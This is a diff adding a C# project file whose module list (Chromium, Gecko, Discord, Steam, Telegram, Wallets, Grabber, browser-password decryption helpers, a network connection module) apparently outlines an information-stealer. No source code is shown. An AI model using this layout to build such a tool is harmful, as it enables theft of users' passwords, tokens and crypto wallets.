@@ -1,0 +1,106 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{E784E83E-0778-4608-8FBA-932B1959C2F6}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>client</RootNamespace>
+    <AssemblyName>client</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>client.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Body\Chromium.cs" />
+    <Compile Include="Body\Discord.cs" />
+    <Compile Include="Body\FTP.cs" />
+    <Compile Include="Body\Gecko.cs" />
+    <Compile Include="Body\Grabber.cs" />
+    <Compile Include="Body\Steam.cs" />
+    <Compile Include="Body\System.cs" />
+    <Compile Include="Body\Telegram.cs" />
+    <Compile Include="Body\Wallets.cs" />
+    <Compile Include="Config.cs" />
+    <Compile Include="Decryption\Aes.cs" />
+    <Compile Include="Decryption\Asn1Der.cs" />
+    <Compile Include="Decryption\Asn1DerObject.cs" />
+    <Compile Include="Decryption\BCRYPT.cs" />
+    <Compile Include="Decryption\BerkeleyDatabase.cs" />
+    <Compile Include="Decryption\Build.cs" />
+    <Compile Include="Decryption\GeckoHelper.cs" />
+    <Compile Include="Decryption\PBE.cs" />
+    <Compile Include="Decryption\PBKDF2.cs" />
+    <Compile Include="Decryption\ResultStruct.cs" />
+    <Compile Include="Decryption\SQLHelper.cs" />
+    <Compile Include="Decryption\TripleDES.cs" />
+    <Compile Include="Decryption\TripleDESHelper.cs" />
+    <Compile Include="Helpers\CompressedFile.cs" />
+    <Compile Include="Helpers\FileHelper.cs" />
+    <Compile Include="Helpers\JsonHelper.cs" />
+    <Compile Include="Helpers\LoaderHelper.cs" />
+    <Compile Include="Helpers\LoggerHelper.cs" />
+    <Compile Include="Helpers\ParserHelper.cs" />
+    <Compile Include="Helpers\TaskHelper.cs" />
+    <Compile Include="Helpers\ZipHelper.cs" />
+    <Compile Include="Models\ChromiumBrowserStructure.cs" />
+    <Compile Include="Models\ChromiumDefaultProfile.cs" />
+    <Compile Include="Models\Credentials.cs" />
+    <Compile Include="Models\DataType.cs" />
+    <Compile Include="Models\DefaultFileStructure.cs" />
+    <Compile Include="Models\ExecutingAssemblyResult.cs" />
+    <Compile Include="Models\Extension.cs" />
+    <Compile Include="Models\FirefoxList.cs" />
+    <Compile Include="Models\FirefoxLogins.cs" />
+    <Compile Include="Models\GeckoBrowserStructure.cs" />
+    <Compile Include="Models\GeckoDefaultProfile.cs" />
+    <Compile Include="Models\GeoInfo.cs" />
+    <Compile Include="Models\GeoInfo2.cs" />
+    <Compile Include="Models\InformationStructure.cs" />
+    <Compile Include="Network\Connection.cs" />
+    <Compile Include="Network\ErrorReporter.cs" />
+    <Compile Include="Network\ErrorStruct.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
